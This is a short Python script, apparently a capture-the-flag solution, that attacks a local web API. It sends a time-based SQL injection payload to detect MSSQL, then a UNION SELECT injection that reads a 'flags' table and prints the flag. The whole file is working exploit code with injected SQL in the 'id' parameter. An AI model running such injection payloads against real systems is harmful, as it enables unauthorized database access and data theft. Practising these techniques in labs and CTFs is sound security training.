#!/usr/bin/env python3
import requests
import time
import re

TARGET = "http://localhost:5007/api/user"

def main():
    # Test time-based
    start = time.time()
    requests.get(TARGET, params={"id": "1; WAITFOR DELAY '0:0:3'--"})
    elapsed = time.time() - start
    
    if elapsed > 2.5:
        print(f"[+] MSSQL detected! Response took {elapsed:.2f}s")
    
    # Extract flag
    r = requests.get(TARGET, params={"id": "0 UNION SELECT 1,value,'x','x' FROM flags--"})
    flag = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag:
        print(f"[+] Flag: {flag.group(0)}")

if __name__ == "__main__":
    main()
